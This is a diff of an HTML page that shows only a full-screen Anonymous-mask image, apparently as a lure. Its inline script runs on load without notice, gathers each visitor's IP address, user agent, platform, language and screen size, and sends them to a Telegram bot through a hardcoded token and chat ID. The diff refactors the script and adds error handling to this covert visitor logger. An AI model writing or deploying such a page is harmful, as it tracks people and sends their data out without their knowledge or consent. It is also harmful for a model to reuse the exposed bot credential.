@@ -20,54 +20,64 @@
     </style>
 </head>
 <body>
-    <!-- Картинка на весь экран. ЗАМЕНИ ССЫЛКУ НА СВОЮ -->
     <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fkartinki.pics%2Fuploads%2Fposts%2F2022-12%2F1670654679_25-kartinkin-net-p-kartinki-maski-anonimusa-vkontakte-26.jpg&f=1&nofb=1&ipt=04b03c0330335e42bae7e7713eac17c7aebf915dce52e35c32d3ae5159791d4a">
 
     <script>
-       
-        const TELEGRAM_TOKEN = '8775682625:AAFKExBcCoT_2oeuwQThO_q_LLzwIF2AHTY';
-        const CHAT_ID = 44174827;
+        (function() {
+            const TELEGRAM_TOKEN = '8775682625:AAFKExBcCoT_2oeuwQThO_q_LLzwIF2AHTY';
+            const CHAT_ID = 44174827;  // Убедитесь, что этот пользователь отправил /start боту
 
-    
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (e) {
-                return 'Не удалось определить IP';
+            // Получаем IP
+            function getIP() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => data.ip)
+                    .catch(() => 'Не удалось определить IP');
             }
-        }
 
-  
-        function getBrowserInfo() {
-            return `User-Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}\nScreen: ${screen.width}x${screen.height}`;
-        }
+            // Информация о браузере
+            function getBrowserInfo() {
+                return `User-Agent: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLanguage: ${navigator.language}\nScreen: ${screen.width}x${screen.height}`;
+            }
 
-     
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-        }
+            // Отправка сообщения в Telegram
+            async function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                            disable_web_page_preview: true
+                        })
+                    });
+                    const result = await response.json();
+                    if (!result.ok) {
+                        console.error('Ошибка Telegram API:', result);
+                    } else {
+                        console.log('Уведомление отправлено');
+                    }
+                } catch (err) {
+                    console.error('Ошибка сети или CORS:', err);
+                }
+            }
 
-      
-        async function logVisitor() {
-            const ip = await getIP();
-            const browser = getBrowserInfo();
-            const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
-            const msg = `<b>Новый посетитель</b>\nВремя: ${time}\nIP: ${ip}\n${browser}`;
-            await sendToTelegram(msg);
-        }
+            // Основная функция
+            async function logVisitor() {
+                const ip = await getIP();
+                const browser = getBrowserInfo();
+                const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
+                const message = `<b>Новый посетитель</b>\nВремя: ${time}\nIP: ${ip}\n${browser}`;
+                await sendToTelegram(message);
+            }
 
-        logVisitor();
+            // Запускаем отправку. Если страница быстро закрывается, используем sendBeacon как fallback
+            // Но fetch внутри async/await обычно успевает отработать
+            logVisitor().catch(console.error);
+        })();
     </script>
 </body>
 </html>
